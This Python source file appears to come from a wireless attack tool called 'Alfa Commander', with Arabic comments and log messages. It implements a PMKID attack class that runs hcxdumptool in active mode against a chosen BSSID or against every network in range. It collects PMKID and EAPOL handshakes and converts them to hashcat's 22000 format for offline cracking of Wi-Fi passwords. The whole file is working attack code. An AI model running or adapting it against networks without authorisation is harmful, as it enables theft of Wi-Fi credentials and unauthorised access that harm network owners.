# ============================================================
# Alfa Commander - PMKID Attack Logic
# هجوم PMKID
# ============================================================

from __future__ import annotations

from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Callable, Optional

from app.constants import AttackState, EVIDENCE_DIR
from app.core.tools import hcxdumptool
from app.utils.validators import normalize_mac
from app.logger import get_logger

logger = get_logger()


@dataclass
class PMKIDSession:
    session_id: str
    bssid: Optional[str]
    interface: str
    state: str = AttackState.IDLE
    started_at: Optional[datetime] = None
    finished_at: Optional[datetime] = None
    pcapng_file: Optional[Path] = None
    hashcat_file: Optional[Path] = None
    pmkid_count: int = 0
    eapol_count: int = 0
    log: list[str] = field(default_factory=list)
    error: Optional[str] = None

    @property
    def success(self) -> bool:
        return self.pmkid_count > 0 or self.eapol_count > 0


class PMKIDAttack:
    def __init__(
        self,
        interface: str,
        bssid: Optional[str] = None,
        duration: int = 120,
        channel: Optional[int] = None,
        active_attack: bool = True,
        on_event: Optional[Callable[[str, dict], None]] = None,
    ):
        self.interface = interface
        self.bssid = normalize_mac(bssid) if bssid else None
        self.duration = duration
        self.channel = channel
        self.active_attack = active_attack
        self.on_event = on_event

        safe_name = self.bssid.replace(":", "") if self.bssid else "all"
        self.pcapng_file = EVIDENCE_DIR / (
            f"pmkid_{safe_name}_{int(datetime.now().timestamp())}.pcapng"
        )

        self.session = PMKIDSession(
            session_id=f"pmkid_{int(datetime.now().timestamp())}",
            bssid=self.bssid,
            interface=interface,
            pcapng_file=self.pcapng_file,
        )
        self._process: Optional[hcxdumptool.StreamingProcess] = None

    async def start(self) -> PMKIDSession:
        self.session.state = AttackState.RUNNING
        self.session.started_at = datetime.now()

        opts = hcxdumptool.HCXDumpOptions(
            interface=self.interface,
            output_file=self.pcapng_file,
            bssid_filter=[self.bssid] if self.bssid else None,
            channel_filter=[self.channel] if self.channel else None,
            active_attack=self.active_attack,
            duration=self.duration,
        )

        self._process = await hcxdumptool.HCXDumptool.capture(opts)
        self._process.on_stdout = self._handle_line
        self._process.on_stderr = self._handle_line
        self._process.on_exit = self._handle_exit

        self._emit("started", {
            "session_id": self.session.session_id,
            "bssid": self.bssid,
            "file": str(self.pcapng_file),
        })

        logger.info(
            f"بدء التقاط PMKID على {self.bssid or 'كل الشبكات'} "
            f"لمدة {self.duration} ثانية"
        )
        return self.session

    async def stop(self) -> PMKIDSession:
        if self._process and self._process.running:
            await self._process.stop()
        # انتظر لضمان كتابة الملف
        import asyncio
        await asyncio.sleep(1)
        await self._finalize()
        return self.session

    async def _finalize(self):
        """تحليل النتائج والتحويل."""
        if not self.pcapng_file.exists():
            self.session.state = AttackState.FAILED
            self.session.error = "لم يتم إنشاء ملف الالتقاط"
            return

        result = hcxdumptool.HCXDumptool.parse_capture_results(self.pcapng_file)
        self.session.pmkid_count = result.pmkid_count
        self.session.eapol_count = result.eapol_count

        if result.success:
            hc_file = self.pcapng_file.with_suffix(".22000")
            hcxdumptool.HCXDumptool.convert_to_hashcat(self.pcapng_file, hc_file)
            if hc_file.exists():
                self.session.hashcat_file = hc_file

            self.session.state = AttackState.SUCCESS
            logger.info(
                f"تم التقاط {self.session.pmkid_count} PMKID و "
                f"{self.session.eapol_count} EAPOL"
            )
        else:
            self.session.state = AttackState.FAILED
            self.session.error = "لم يتم التقاط أي PMKID أو EAPOL"

    def _handle_line(self, line: str):
        if not line:
            return
        self.session.log.append(line)

    def _handle_exit(self, rc: int):
        self.session.finished_at = datetime.now()
        # التحليل النهائي يتم في stop() لأن hcxdumptool قد يُقتل

    def _emit(self, event: str, data: dict):
        if self.on_event:
            try:
                self.on_event(event, data)
            except Exception:
                pass


async def capture_pmkid(
    interface: str,
    bssid: Optional[str] = None,
    duration: int = 120,
    channel: Optional[int] = None,
) -> PMKIDSession:
    """دالة مختصرة للتقاط PMKID."""
    attack = PMKIDAttack(
        interface=interface,
        bssid=bssid,
        duration=duration,
        channel=channel,
    )
    await attack.start()
    import asyncio
    await asyncio.sleep(duration + 2)
    return await attack.stop()
